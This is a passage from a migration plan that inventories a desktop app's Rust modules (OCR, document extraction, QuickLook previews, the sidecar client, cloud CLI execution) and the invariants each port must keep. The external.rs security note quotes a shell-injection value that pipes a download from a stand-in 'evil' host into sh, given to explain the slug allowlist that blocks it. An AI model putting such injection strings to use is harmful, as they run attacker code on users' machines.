**Replacement:** PyObjC in the sidecar: Vision (VNRecognizeTextRequest + VNImageRequestHandler, synchronous performRequests) for recognition; rasterize PDF pages with pypdfium2 (simpler than a PyObjC CGBitmapContext port, prebuilt wheels) applying the same scale/area/edge caps, encode PNG with Pillow or hand pixels to Vision as CGImage.

**Must preserve:**
- Language list is prefix-matched against supportedRecognitionLanguages and the DEVICE'S OWN identifiers are passed back — handing Vision an unknown code makes it refuse the ENTIRE request silently ('OCR found nothing')
- Only English+Hebrew used to be requested: Russian/Chinese/Japanese scans came back empty and French was read AS English, mangling accents — the 20-prefix list is the fix
- Page caps: area cap alone bounds NEITHER edge (a /MediaBox [0 0 250000000 0.001] has trivial area and asked CG for a 2GB bitmap) — per-edge clamp is separate and both are attacker-relevant (OCR runs on any text-less imported/downloaded PDF)
- Poster pages scale DOWN rather than refuse; white painted behind transparent pages so vector text doesn't recognize as light-on-black
- Partial reads are DECLARED in the text (cap note + unrendered-page note, cap first) so neither reader nor model treats a partial read as the whole file
- recognize() is best-effort: any failure returns None and import falls back to 'no text'; callers prefix '(text recognized from scan)'

**Gotchas:**
- The KNOWN-TRAP note about PyObjC applies to ScreenCaptureKit streaming callbacks only — Vision's performRequests is synchronous and QL-style completion blocks do fire; don't over-generalize the trap into avoiding PyObjC here
- Vision requests must run off the main sidecar thread (they block seconds per page); the job-lane serialization lives in files.rs's successor, not here
- page_raster_size rounding (.ceil then .min) intentionally allows a sub-pixel overshoot of the area cap — keep the tolerance or the poster test fails

**Native/Tauri surface:** objc2-vision: VNRecognizeTextRequest, VNImageRequestHandler, VNRecognizedTextObservation; objc2-core-graphics: CGPDFDocument, CGPDFPage, CGBitmapContextCreate (extern C), CGContext draw/scale/translate; objc2-foundation: NSData, NSArray, NSDictionary, NSString; image crate: PNG encode

### `src-tauri/src/commands/castparse.rs` — 399 LOC → python-sidecar (1 d)

Deterministic character-sheet parser for the Story tab (no tauri commands; called from story.rs): recognizes person headings and labeled fields (appearance/backstory families, longest-label-first), caps at 40 found, NO MODEL by design — it cannot invent a hero or reword a description.

**Replacement:** Python port beside the story flows in the sidecar; ParsedMember keeps camelCase serde names (the shape round-trips to the preview UI and back with edits).

**Must preserve:**
- No model asked, stated as the design: free, instant, nothing leaves the Mac, and incapable of hallucinating a cast member; unreadable files say so rather than guess
- Heading detection deliberately conservative — a false positive splits one hero into two, worse and less obvious than missing a heading
- Labels matched longest-first ('backstory' never matched as 'story' with 'back' left in the value)
- MAX_FOUND=40: a novel's every capitalised line misread as sixty people is worse than none

### `src-tauri/src/extraction/pptx.rs` — 301 LOC → python-sidecar (1 d)

PPTX extraction: slides in slideN order with [slide N] labels, speaker notes (resolved via the slide's rels part) as [slide N notes], chart and diagram parts appended, all under one shared byte budget.

**Replacement:** Python zipfile + the same xml_paras_to_text approach (replace </a:p> with newline, strip tags); do NOT use python-pptx (heavier, and its text model skips chart/diagram parts this reader deliberately includes).

**Must preserve:**
- Speaker notes are load-bearing: in a real deck they carry the argument and numbers the headline only hints at — reading bodies alone left the assistant answering from titles
- Notes of un-annotated slides still exist and render the slide number; only >1 word of prose is kept
- Charts (ppt/charts/chartN.xml) and SmartArt (ppt/diagrams/data) extracted — a deck whose numbers are all in charts otherwise indexes to headings only
- One aggregate budget across all slides (per-slide caps alone let hundreds of near-cap slides balloon the total)

**Gotchas:**
- Notes part resolution goes through the slide's _rels file — slideN.xml does not imply notesSlideN.xml

### `src-tauri/src/formats.rs` — 299 LOC → electron-main (1 d)

THE FORMAT REGISTRY: one declarative table mapping extension→(viewer kind, text source Raw/Extracted, editable, delivery None/Stream, size ceiling); classify_file with image-by-MIME / code-by-text-extension / plain fallbacks; all_kinds/all_extensions feed the frontend viewer registry and import dialog filters.

**Replacement:** TS module in Electron main (used by get_file_content's successor and shareable with the renderer as types); keep the frontend registry test that asserts a component exists for every kind so drift stays a failing test.

**Must preserve:**
- One row per format family — before this, classify_file/editModeOf/ViewerRouter drifted independently and 'compare spreadsheet versions' broke on exactly that
- First matching row wins, no extension claimed twice (test-enforced); extension beats MIME (image/svg+xml opens the SVG source view; mislabelled octet-stream uploads still open correctly)
- Deliberately NO 'no text' variant — classification sees only name/mime/len and can never know if a file HAS text; 'stored text is None' answers that; a third variant is what hid big scans' OCR text
- Streamed rows have NO byte ceiling (test-enforced — that is the whole point of streaming); raw-text rows past MAX_RAW_TEXT_BYTES (10MB) degrade to the read-only clipped card because editable text crosses IPC unclipped (a clipped buffer saved back truncates the file)
- .sketch is Raw but NOT editable (hand-editing the JSON could produce a file the drawing editor cannot open); .eml raw for the MIME-parsing viewer while extract_text separately derives prose
- all_kinds also names audio/video/recording/binary (classified upstream by stt::media_kind) so the frontend coverage test sees every kind

**Gotchas:**
- The renderer's registry test is the only drift guard — carry it over on day one
- txt→prose and log→log (not code) is a deliberate UX decision; a naive 'text file = code editor' port regresses it

### `src-tauri/src/extraction/window.rs` — 292 LOC → python-sidecar (1 d)

Windowed reads over large extracted text for the model (ADD-27): smart_filter drops noise lines and collapses runs of identical lines PAST 6 with an explicit '[N lines omitted]' note; partition_windows yields overlapping char-range windows preferring paragraph seams.

**Replacement:** Direct Python port inside the sidecar's summarize/read-file tooling; pure functions, port with the existing tests.

**Must preserve:**
- MAX_IDENTICAL_RUN=6: collapsing EVERY consecutive duplicate was a silent edit of the data — 'how many zero-value cash entries' was answered 1 instead of 3; repetition is only noise past any table read row-by-row
- Nothing removed silently: every collapsed run writes down its count
- READ_WINDOW_MIN=200 floor; windows snap to char boundaries (floor/ceil_char_boundary), no gaps in coverage

**Gotchas:**
- Byte offsets vs char offsets again — Python slicing is chars; window ranges cross IPC and must mean the same thing on both sides

### `src-tauri/src/commands/docs_html/minutes.rs` — 285 LOC → python-sidecar (0.5 d)

Meeting-minutes template (ADD-22): minutes_schema() JSON schema the model fills via structured output, merge_minutes() deterministically merges per-window results (window order kept, case-insensitive dedup of attendees/decisions/timeline/actions), render to the HTML doc.

**Replacement:** Python port inside the sidecar's minutes flow (the model call already lives there): same schema dict, same merge with ordered case-insensitive dedup; rendering can call main's html_document or duplicate the template.

**Must preserve:**
- Rust merges, not the model — a long meeting must not lose its second half to a model that only had room for the first
- Timeline keeps window order (the meeting's own order); overlap between windows deduped; first non-empty title/date wins

### `src-tauri/src/extraction/xlsx.rs` — 267 LOC → python-sidecar (1.5 d)

XLSX extraction via umya-spreadsheet: every populated cell (string AND numeric), ' | '-joined rows under [sheet: name] headers, 100k-row/1k-col/16MB bounds with ANNOUNCED truncation, and dual zip-bomb guards (declared sizes + streaming re-count of actual inflated bytes).

**Replacement:** python-calamine (prebuilt, reads populated cells lazily) for extraction — NOT openpyxl for reading (slow on big books); re-implement both zip-size guards with zipfile before handing bytes to any parser.

**Must preserve:**
- Reads every cell, not just sharedStrings — an all-numeric sheet used to extract to nothing and the model saw the file as empty
- ' | ' separator, never tabs: normalize_whitespace collapses tabs and blank cells vanished, letting the model line columns up wrong
- Walks POPULATED cells only, never the bounding rectangle — a 2-cell sheet whose highest cell is at 100000x1000 spans 100M coordinates and cost seconds under the room mutex
- Whatever a bound cuts is announced in the text; the deliberate width (old 5000x100 cut silently hid most of a big sheet from search while the viewer showed every row)
- 512MB decompressed ceiling: declared-size check is only the fast path — umya's zip does not bound inflate output by declared sizes, so the streaming re-count is the real guard

**Gotchas:**
- python-calamine renders floats/dates differently than umya's cell.value() — pin with fixtures, the search index must not change wording
- The zip guards protect a library that fully materializes the workbook BEFORE any row bound applies — the guard must run before the library, not inside the loop

### `src-tauri/src/quicklook.rs` — 253 LOC → python-sidecar (1.5 d)

QuickLook thumbnail generation — the universal preview fallback (.key/.pages/.numbers/.doc/.ppt/RAW/PSD/3D): writes decrypted bytes to a 0600 create_new temp file KEEPING the extension, renders via QLThumbnailGenerator at 1400pt/2x with a 20s timeout, always deletes the temp copy.

**Replacement:** PyObjC QLThumbnailGenerator (generateBestRepresentationForRequest_completionHandler_ with a threading.Event + 20s timeout; representationTypes=All), NSBitmapImageRep PNG encode; temp hygiene ported exactly (0600 from creation via os.open(O_CREAT|O_EXCL, 0o600), uuid stem, extension preserved, finally-delete).

**Must preserve:**
- PRIVACY BARGAIN stated in the header: QuickLook takes a FILE URL so decrypted bytes must touch disk for the render — owner-only perms from creation (not created-then-chmod: between those steps another process can already have the file open), create_new so an existing path is refused not clobbered, removed on BOTH success and failure paths
- The temp copy MUST keep the original extension — QuickLook dispatches on it; without it the OS has no idea how to draw the file
- 20s timeout: third-party QL extensions run out of process and can hang; a preview must never wedge a room operation
- RepresentationTypes::All lets the OS fall back to icon-with-preview rather than returning nothing
- Image-only limit is genuine and the UI says so (no text selection/search)

**Gotchas:**
- The completion handler fires on a background queue — a PyObjC block plus an Event works, but the channel-gone-after-timeout send must stay non-fatal
- Blocking a sidecar worker thread for up to 20s is fine only because callers serialize; do not call from the HTTP handler thread pool without a limit

**Native/Tauri surface:** objc2-quick-look-thumbnailing: QLThumbnailGenerator, QLThumbnailGenerationRequest, QLThumbnailRepresentation; objc2-app-kit: NSBitmapImageRep (PNG encode); block2: completion-handler blocks; objc2-foundation: NSURL

### `src-tauri/src/commands/library.rs` — 251 LOC → electron-main (1 d)

Memories (add/list/update/delete/restore with char-counted cap that REFUSES not truncates, normalized dedup, fixed category vocabulary), folders CRUD + move_file_to_folder, and generic get_setting/set_setting with privacy-policy cache refresh on cloud_privacy*/model keys.

**Replacement:** Direct TS port over the DB layer in main; the set_setting→refresh_policy hook must call whatever owns the privacy-policy cache in the new split.

**Must preserve:**
- Memory cap counted in CHARACTERS not bytes (byte counting ate Hebrew notes at half length) and REFUSES over-length rather than truncating (memories have no version history — truncation was silent and unrecoverable)
- Exact-duplicate memories return the existing row (caller tells by created_at); trashed memories do NOT count as duplicates (trashing 'buy milk' must not block re-adding it)
- normalize_category folds onto the fixed 4-word vocabulary, anything else→None never an error (a 4B model cannot reproduce an enum exactly)
- set_setting refreshes the cached privacy policy when key starts with cloud_privacy or equals model

**Gotchas:**
- A source-text test pins that BOTH memory commands check the cap (include_str! pattern) — port the guard idea, not the include_str mechanism

**Native/Tauri surface:** tauri::command, State, tauri::AppHandle

### `src-tauri/src/commands/docx_edit.rs` — 231 LOC → electron-main (1.5 d)

update_docx_text command: user-facing Word editing — lines up stored extracted text's paragraphs against the edited buffer's, pushes only the DIFFERING ones through the docx run-split matcher, refuses added/removed paragraphs and ambiguous (repeated-verbatim) paragraphs with actionable messages.

**Replacement:** IPC handler in Electron main doing the paragraph diff + orchestration; the actual splice call goes to the sidecar's docx matcher port; DB write via store_file_bytes' successor (snapshot + overwrite in one transaction).

**Must preserve:**
- Per-paragraph on purpose: replacing document.xml wholesale from plain text throws away everything that makes it a Word file; untouched paragraphs are not rewritten AT ALL, so runs/fonts/fields survive byte-for-byte
- Ok(None) for a no-change save — reporting it as an error made a whitespace-only change unclosable (Save said 'Could not save', the unsaved-edits dialog read failure as 'edit still here', Discard was the only exit)
- Paragraph-count mismatch refused in plain language WITH both counts (insert position is not a question text alone can answer)
- count>1 (paragraph repeated verbatim) refused — editing one of two identical lines would silently rewrite both
- New searchable text re-derived from the PATCHED FILE, never the editor buffer — the reader shows headers/footnotes/comments living in parts this rewrite doesn't touch, and storing the buffer would delete them from the index
- Failure message names the header/footnote/comment cause when a paragraph lives outside document.xml

**Gotchas:**
- Paragraph alignment depends on extract_text's paragraph rendering staying stable — extractor drift breaks the diff invisibly

**Native/Tauri surface:** tauri::command, State, tauri::Emitter (room-files-changed)

### `src-tauri/src/extraction/pdf_quality.rs` — 226 LOC → python-sidecar (0.5 d)

Judges whether extracted PDF text is good enough to index: fault_in() detects Empty / NoWordBreaks (space ratio <0.06) / Undecodable (>2% U+FFFD) / NotLanguage (<80% readable chars) on a 20k-char sample; should_reread_with_ocr drives the OCR re-read; choose() keeps faultless embedded text over OCR and never lets a blank recognition erase a real reading.

**Replacement:** Direct Python port of the ratio checks and choose(); constants unchanged; sits between extraction and the OCR queue decision in the import pipeline.

**Must preserve:**
- The missing question this answers: pdf-extract returns SOMETHING and reports success for interleaved columns / run-together words / glyph-index soup — 'no text at all' was never the only failure mode
- Texts under 200 chars judged only on emptiness (cover pages legitimately carry a dozen words; ratios over 40 chars are noise)
- choose(): extracted kept unless faulty, OCR only if itself not faulty — Vision can misread a ligature where embedded text is exact

**Gotchas:**
- MIN_SPACE_RATIO was tuned for Latin+Hebrew prose; CJK text has legitimately low space ratios — the current code has this exposure too, do not 'fix' silently, keep parity

### `src-tauri/src/commands/recent.rs` — 226 LOC → electron-main (0.5 d)

Recent-rooms list outside any room: recent.json in app data, 0600 with re-tighten (holds room names like 'Divorce papers' beside encrypted rooms), temp-then-rename writes, most-recent-first dedup cap 5, rename propagation, missing-file marking off the UI thread.

**Replacement:** TS in main using app.getPath('userData'): fs.openSync with mode 0o600 + fchmodSync (re-tighten existing files), write tmp + rename, fs.existsSync in a worker or async stat for the missing check.

**Must preserve:**
- 0600 set TWICE on purpose: mode() only applies at creation, and a leftover from an older build must not keep 0644 — the list is one of the two PLAINTEXT files beside encrypted rooms
- Temp-then-rename: a truncated recent.json silently reads back as 'no recent rooms at all'
- list_recent is async DELIBERATELY: exists() on an unresponsive network mount blocks for the mount timeout, freezing the start screen in exactly the unplugged-drive case the check exists for
- Recents carries its OWN copy of each room's name (locked rooms can't be read) so rename_room must rewrite it
- Dedup by path, insert at front, truncate 5

**Gotchas:**
- Electron main is single-threaded — the stat must be truly async (fs.promises.stat) or the same freeze returns

**Native/Tauri surface:** tauri::command, tauri::AppHandle, app.path().app_data_dir(); unix mode/permissions (0600)

### `src-tauri/src/extraction/pdf.rs` — 208 LOC → python-sidecar (1.5 d)

PDF text extraction via pdf-extract (panic-contained) plus the visual-order Hebrew repair: detects mirror-extracted Hebrew (marks orphaned after spaces), reverses lines, un-mirrors digit/Latin runs, re-attaches combining marks, collapses glyph-cluster spaces.

**Replacement:** pypdfium2 (prebuilt PDFium wheels) for text extraction — strictly better than pdf-extract on layout — with fix_visual_hebrew ported verbatim and re-benchmarked, since a better extractor may already emit logical order for some of the same files.

**Must preserve:**
- Whole-document detector before any repair: >200 Hebrew letters, >50 orphan marks, orphan*20>letters — logical Hebrew and English pass through UNTOUCHED
- Per-line: reverse, un-mirror ASCII alphanumeric runs (13 must not become 31), move mark-runs behind their base letter, single space between Hebrew = intra-word cluster gap (dropped), 2+ spaces = real word gap
- strip_hebrew_marks exists because the FTS unicode61 tokenizer treats nikud as SEPARATORS — search text must be consonantal (consumed by the indexing layer)
- is_heb_mark excludes maqaf/paseq/sof-pasuq/nun-hafukha from the combining range

**Gotchas:**
- Changing the extractor changes which documents LOOK visual-order; the detector thresholds were tuned against pdf-extract output — rerun the Bible-PDF fixtures against pypdfium2 before trusting the port
- PDFium is a native lib: a crash kills the sidecar process; wrap extraction in a subprocess or accept the blast radius consciously

### `src-tauri/src/extraction/chunking.rs` — 187 LOC → python-sidecar (0.5 d)

Split extracted text into ~target_chars chunks for the search index: paragraph boundaries first, then lines, then words.

**Replacement:** Direct Python port (~60 lines) in the sidecar's indexing pipeline; property-test the invariant that rejoined chunks equal the original word sequence.

**Must preserve:**
- Chunking is a SPLIT not a summary: every word survives, once, in order — a dropped word is a sentence that can never be found again
- CRLF normalized FIRST or a Windows-authored file (CSV, Notepad txt, eml) has no \n\n at all and arrives as ONE paragraph
- Oversized paragraphs cut at LINES first (spreadsheet rows / log lines are the structure readers navigate by), words only when a single line exceeds the target
- Empty documents produce NO chunks, never one blank row; byte-length checks never split inside a multi-byte char

**Gotchas:**
- Length checks count BYTES while text is chars — Python len() counts chars, so a naive port changes chunk sizes for Hebrew rooms; decide and pin with the multibyte test

### `src-tauri/src/extraction/html.rs` — 93 LOC → electron-main (0.5 d)

strip_html: lossy HTML→text for retrieval — narrows to <main>/<article> when present, drops nav/header/footer/aside/form/script/style/noscript/svg bodies, then strips tags.

**Replacement:** Direct TS port (~50 lines) kept next to the article extractor; or in Python if the import pipeline stays sidecar-side — it is pure string logic either way.

**Must preserve:**
- ASCII-only case folding for tag search: Unicode to_lowercase is NOT length-preserving (Turkish İ 2→3 bytes) and offset drift panicked mid-import — ports using toLowerCase() on the haystack for offsets have the same bug in reverse
- Malformed close-before-open (</article> before <article>) keeps the page whole rather than slicing backwards
- This pipeline is lossy BY DESIGN for retrieval — the html_edit module must never be built on it

**Gotchas:**
- JS toLowerCase is also not length-preserving for İ — use the same ASCII-only fold

### `src-tauri/src/commands/json.rs` — 58 LOC → python-sidecar (0.25 d)

Lenient pluckers for model JSON replies (json_str_field/json_array/value_str): a bad reply is never fatal — the field is absent and the caller falls back.

**Replacement:** Trivial Python helpers (or inline dict.get chains) wherever the studios/file-meta reply shaping lands; note the module comment records that bool/tag-array pluckers already migrated to the sidecar in Phase 3.

**Must preserve:**
- Lenient contract in one place: non-JSON, non-object, missing key all → None/empty, never an error
- Callers distinguish 'empty string kept' from 'missing' with their own filters

### `src-tauri/src/commands/preview.rs` — 47 LOC → electron-main (0.5 d)

quicklook_preview command: read file bytes (lock dropped before rendering), render via quicklook::preview_png on a blocking worker, return base64 PNG; Ok(None) when the OS has nothing to draw ('this Mac can't preview it either' is a normal answer, not an error banner).

**Replacement:** IPC handler in main: read blob from DB, POST bytes to the sidecar's QuickLook endpoint, return PNG (prefer a Buffer over base64 across contextBridge).

**Must preserve:**
- Room lock released BEFORE the render — QuickLook can take seconds and holding the mutex froze every room operation behind a preview
- None ≠ error: distinct UI copy for 'no preview available'

**Native/Tauri surface:** tauri::command, tauri::Manager, tauri::async_runtime::spawn_blocking

**Subsystem risks:**
- Extraction parity IS the product: every extractor's output is the search index, RAG corpus, and the model's view of each file. Dozens of one-line invariants in comments fixed live-QA 1/5 failures (Turkish encoding, RTF accents, Hebrew mirroring, numeric entities, xlsx columns). Build a golden-fixture corpus (run the Rust extractors over a format zoo, freeze outputs) and diff the Python port against it before cutover; decide explicitly whether .room migration re-extracts (index changes) or carries old text (old bugs preserved).
- Encoding subsystem is the hardest parity problem: chardetng (Firefox's detector) has no exact Python equivalent — charset-normalizer guesses differently on ambiguous single-byte files, and Python codec names ('cp1254') differ from the WHATWG names ('windows-1254') the viewer's encoding strip/picker contract requires. Use chardetng-py if viable, and build a WHATWG-name shim either way; the picker round-trip (offered label == reported name) is test-pinned today.
- The fold_edit_char normalization table is shared by THREE matchers (plain-text edit_match in the agent subsystem, docx splice, html splice). The proposed split puts edit application in the sidecar — whoever owns edit_match must import the SAME table. Two copies in two languages will drift and drift here corrupts documents on save.
- Panic containment has no direct equivalent: Rust catch_unwind confined a malformed file's cost to its own text. Python try/except covers pure-Python parsers, but native extensions (pypdfium2, lxml, python-calamine) can segfault and kill the whole sidecar — strictly worse than today. Subprocess-isolate the parsers of untrusted bytes, or accept sidecar restarts as the blast radius and make the import pipeline resume.
- xlsx WRITE fidelity: umya-spreadsheet round-trips workbooks; openpyxl drops charts/pivot tables on rewrite, so a one-cell set_cell would silently strip workbook features. The safe route is a raw-XML cell splice (one <c> element changed, every other zip entry raw-copied) — non-trivial because of shared-string vs inline-string cell types, but it is the only no-loss option in TS/Python.
- Import-pipeline concurrency invariants are undocumented outside comments: room-epoch + path double-pinning of queued OCR/STT jobs (a rollback keeps the path, so path alone passes), single-lane serialization (30 scans one at a time), lock-drop-before-enqueue ordering, and STT_CURRENT-cleared-before-count-drops visibility. An async TS rewrite loses these silently; port them as named invariants with tests.
- roommedia:// streaming with Range support deliberately replaced base64-over-IPC and its 50MB cliff (a file one byte over silently lost its real viewer). The Electron replacement needs protocol.handle with Range headers and lock-scoped token invalidation, or large PDFs/decks/videos regress.
- textutil (/usr/bin/textutil) is load-bearing for .doc/.rtf text AND HTML views, but it applies zero validation of its own — the OLE-magic gate and the NUL/control-char echo detector are the only things stopping renamed junk from indexing its own bytes as prose. crate::textutil itself was not in this file list; confirm another inventory covers it or fold it into this workstream.
- PyObjC for QuickLook and Vision is sanctioned and works (the pyobjc #647 trap is specific to ScreenCaptureKit streaming callbacks), but the decrypted-temp-file discipline around QuickLook (0600 from creation via O_EXCL, extension preserved for dispatch, deletion on every path, 20s hang timeout) is a privacy promise, not a nicety — port it exactly and keep the leftover-file tests.
- 36 command names and 7 event channels (room-files-changed, import-progress, ocr-progress, stt-progress, agent-open-file, file-updated, plus the FileContent/DecodedFileText payload shapes with camelCase serde names stored in DB columns like web_meta) are the frontend contract; src/api.ts rewiring must keep them byte-identical or coordinate a rename sweep.

## 8. Engines, sidecar & models

The engines-sidecar-models subsystem (~8,900 LOC Rust) is the host side of every AI call: it spawns and supervises the Python LangGraph sidecar (the app's SOLE engine, no native fallback) and the on-demand `ollama serve` daemon, streams the /run NDJSON answer into ask-* UI events with per-run identity, delivers verified cancellation, manages the Ollama model catalog (pull/warm/delete/capabilities), detects and executes the two cloud coding CLIs (claude/codex) as one-shot subprocesses with a scraped/queried model catalog, holds the OpenRouter provider integration (Keychain key, live catalog with media-modality merges, runtime-config injection), provisions uv/node runtimes for MCP connectors with pinned SHA-256 downloads, and publishes one declared capability record per engine (tri-state Support with Unknown as a first-class answer, preflight verdicts, the provider x agent matrix). In the rewrite virtually all of it lands in Electron main as TypeScript: the sidecar HTTP/NDJSON client, both process lifecycles (child_process + health probes + busy guards), CLI execution via shell-less spawn, provider/catalog caches, and the capability table. The error-sentinel strings (OLLAMA_DOWN, MODEL_MISSING:<model>, SIDECAR_UNAVAILABLE:, SIDECAR_DOWN prose) are a byte-exact contract with the React frontend and the timeout lattice (60s metadata < 300s pull-stall < 900s EXTERNAL_IDLE < 1200s STREAM_IDLE < 3600s request) is pinned by tests and must be preserved as a set.

### `src-tauri/src/sidecar.rs` — 2331 LOC → electron-main (7 d)

HTTP/NDJSON client for the Python sidecar - the app's only answering path. sidecar_json/_timeout/_cancellable/_cancellable_run POST feature endpoints; generate_stream streams tool-less generation; run_via_sidecar drives POST /run and translates the NDJSON event stream (plan/agent/lane/round/delta/step/report/final/privacy/usage/error) into ask-* Tauri events, accumulates tool effects via the loopback MCP bridge sink, and classifies the outcome (Done/Unavailable/EngineError/Failed). Also: error-sentinel reconstruction (SidecarError::sentinel), cancel delivery with confirmation, sticky lane routing, bridge tier selection, /forget on room close.

**Replacement:** TS SidecarClient module in Electron main using undici/fetch with AbortController; NDJSON parsed with a small line-splitter over the response body stream; ask-* events forwarded to the renderer via webContents.send with the same TurnId envelope (runId/chatId); cancel delivered by POST /cancel exactly as today. The fake-NDJSON-server tests port directly to node:http fixtures.

**Must preserve:**
- No-fallback rule: sidecar failure BEFORE any tool ran surfaces Unavailable; a mid-run failure after a tool ran is Failed and NEVER retried (the side-effect already committed; re-running would double it). tool_ran is read from BOTH the in-stream step line and the bridge's own dispatch flag (two independent connections; a crash between them must not lose the write)
- Error sentinels are a frontend contract: 'OLLAMA_DOWN' literally triggers the Open Ollama button (composer.isOllamaDown); SIDECAR_DOWN deliberately maps to different prose so a cloud-model room is never told to open Ollama; MODEL_MISSING is re-tagged 'MODEL_MISSING:<model>' host-side because the sidecar does not echo the model
- Stream mirror: `streamed` accumulates deltas and is CLEARED on each `round` (matching the UI); a stream that ends without `final` is Failed('ended without an answer'), never Done("") - and every failure path returns answer_so_far (real final if non-whitespace, else the mirror) so a stopped/stalled run keeps the text the user watched arrive
- failure_outcome: tool_ran OR (visible turn with non-empty text) => Failed (keeps partial); else EngineError. headless deliberately excluded so a workflow step still fails on a stall instead of handing the next node a truncated 'success'
- Per-line run_id filtering: a line stamped with a DIFFERENT run is dropped, an unstamped line (older sidecar) is read; the usage event strips 't' and 'run_id' before emit/persist because its whole NDJSON object becomes AskTokenUsage and is written into the room DB
- Cancel is DELIVERED, not implied: dropping the request does not stop uvicorn handlers (measured ~3s run-on), so Stop POSTs /cancel with the run_id, reads {ok,known}, retries once after 150ms (known:false can be a registration race), and logs an unconfirmed Stop; chain endpoints (/wf_node) MUST use the run-id variant
- Timeouts: SIDECAR_TIMEOUT=3600s (shared with ollama.rs::client_timeout - one budget so the gateways cannot drift), SIDECAR_CHAIN_TIMEOUT=10h, STREAM_IDLE_TIMEOUT=1200s (deliberately the LOOSEST watchdog - caller 300/960s and sidecar EXTERNAL_IDLE 900s must fire first); connect errors classify as OLLAMA_DOWN, timeouts keep their own message
- Both injection points on every body: inject_policy (privacy door, skipped on privacy_bypass, idempotent when 'privacy' key present) then ensure_provider_catalog + inject_provider_runtime; a provider-config failure after the bridge started must tear the bridge down and merge the effects sink back (leaked port + lost vision_chat otherwise) and surfaces as EngineError not Unavailable
- busy() guard held for the WHOLE request/stream so a missed health probe on another task cannot SIGTERM the sidecar serving it; wake_daemon skipped for CLI/API models (a cloud room must work on a Mac with no Ollama)
- EMPTY_GENERATION_HINTS matches specific allowance phrases only - a bare 'quota' substring false-positived on disk quotas and filenames; safe_validation_detail extracts only loc/msg pairs from FastAPI 422 bodies because the rejected input value can contain the API key
- sticky_lanes: lanes latch monotonically over prior USER turns (skipping the last composed message which carries injected context); 'write' stays question-only (cosmetic label)
- Every exit funnels through finished() -> obs::run_end; a user Stop is logged 'stopped' even though it returns as Done

**Gotchas:**
- AbortController.abort() closes the socket but does NOT stop the sidecar's non-streaming handler - the /cancel-by-run_id protocol is load-bearing, do not 'simplify' it away
- The biased select prefers draining stream data over the cancel arm; a naive Promise.race in TS can starve either side - poll cancel at ~100ms while awaiting the next chunk
- The frontend cannot tell engines apart by design - event names AND payload shapes (ask-step {label,node}, ask-report {node,text,ok}, ask-token-usage) must survive byte-identical or effects.ts breaks silently
- stream_run is generic over the runtime purely for testability; the test suite proved the terminal-error arm was revertible with 884 tests green until the fake-server tests existed - port those tests, not just the code

**Native/Tauri surface:** tauri::Window::emit (via TurnId envelope); tauri::State<AppState>; tauri::Manager; tauri::async_runtime::spawn; tauri::test mock runtime (tests); tokio select!/pin!/time; reqwest streaming

### `src-tauri/src/commands/external.rs` — 1387 LOC → electron-main (7 d)

Cloud coding CLIs as engines: composite model ids ('codex-cli::gpt-5.6-sol::high') split/validated; Codex catalog via `codex debug models` JSON (process-cached, real per-slug context_window); Claude catalog SCRAPED from the ~230 MB installed executable's JS string table (chunked+overlapped scan, content-based label parse with model-id cross-check, versioned newest-per-family, unversioned alias fallback); CLI detection via interactive login shell; run_external executes one prompt through `claude -p --output-format json` / `codex exec --json` with MCP-bridge wiring, privacy redaction/restore, temp-dir Drop guard, cancel watcher, and JSON/JSONL result+usage parsers.

**Replacement:** TS module in Electron main. Execution via child_process.spawn with an argv array (no shell) after resolving the login-shell PATH once - this removes the shell-word injection class outright, but keep the is_cli_slug allowlist as defense-in-depth. The Claude executable scan becomes a worker_thread streaming fs read with the same 8 MB chunk + 1 KB overlap; parsers (parse_claude_json_result / parse_codex_json_stream) port 1:1 with their captured-fixture tests.

**Must preserve:**
- SECURITY BOUNDARY: submodel/effort come from the room's `model` setting inside a SHAREABLE room file - a hostile .arcelle can carry `x'; curl evil | sh; '` and the first chat turn would have run it under zsh -ilc. check_cli_slug allowlists [a-zA-Z0-9._:/-], <=64 chars, alnum first; failure is a HARD error naming the field, never a silently dropped flag
- CODEX_ARCELLE_FLAGS keeps an embedded Codex turn ephemeral/read-only/room-scoped: --ignore-user-config --ephemeral --skip-git-repo-check --sandbox read-only approval_policy=never --disable shell_tool --disable unified_exec web_search=disabled (a test enumerates each)
- Codex context windows vary WILDLY per slug (live: 1,050,000 vs 272,000) - codex_context_window reads the catalog (retried on failure, cheap subprocess); Claude's real window rides each response's modelUsage and the constant is only a fallback
- Claude catalog: no listing command exists (re-verified vs 2.1.201/2.1.219); scrape the executable that will be RUN (canonicalize what's on PATH - a VSCode extension bundles a newer copy that would advertise models the executed CLI can't run); every label must be vouched by its own claude-<family>-<version> id in the binary (rejects the real 'Phase 2 - ...' impostor); dated ids accepted, longer versions (4-80 for 4-8) rejected; versions compared numerically (4.10 > 4.9); failed scans are CACHED (unlike Codex) because retrying re-reads 230 MB - fallback is unversioned aliases that cannot go stale
- Detection and execution use `zsh -ilc` because installers add bin dirs only in .zshrc; the result is cached in AppState.external_cache (probe once per session)
- run_external: privacy policy redacts message content and strips images (counting them) BEFORE anything leaves; the reply is restore()d after; attached images (max 3) written decrypted to a per-run temp dir the TempWorkDir guard removes on EVERY exit including panic (and logs when removal fails - it holds decrypted attachments and the bridge bearer token); Claude gets --mcp-config JSON file + --strict-mcp-config + --allowedTools 'mcp__room__*', Codex gets -c mcp_servers.room.* overrides with the token in env PR_ROOM_MCP_TOKEN (never argv - ps can read argv)
- Cancel: a watcher thread kills the child PID on Stop while wait_with_output keeps draining stdout (pipe deadlock otherwise)
- Parsers degrade, never hard-fail: Claude falls back to raw stdout as plain text if the envelope doesn't parse; Codex falls back only if NOT ONE line parsed; Claude input tokens = input + cache_creation + cache_read (all count toward context); Codex answer = LAST agent_message, usage from turn.completed
- is_cloud_model is the exact ':cloud' suffix only - the '<size>-cloud' spelling is deliberately handled in capabilities::engine_id_of, not here

**Gotchas:**
- Scanning 230 MB on Electron's main process event loop will freeze every window - use a worker_thread and keep the min-tiers sanity floor (CLAUDE_MIN_TIERS=2) so a garbled read leaves the fallback in place
- Node spawn without shell removes the injection vector but ALSO removes .zshrc PATH - resolve the absolute CLI path once via the login shell, then spawn it directly
- The catalog caches differ on purpose: Codex retries failures (cheap), Claude does not (230 MB) - preserve the asymmetry
- TempWorkDir's Drop-on-every-path becomes try/finally in TS; the finally must also handle the 'nothing was written' case and log a failed removal by path

**Native/Tauri surface:** std::process::Command via zsh -ilc; tauri::async_runtime::spawn_blocking; base64; std::fs (temp work dir)

### `src-tauri/src/commands/capabilities.rs` — 1019 LOC → electron-main (4 d)

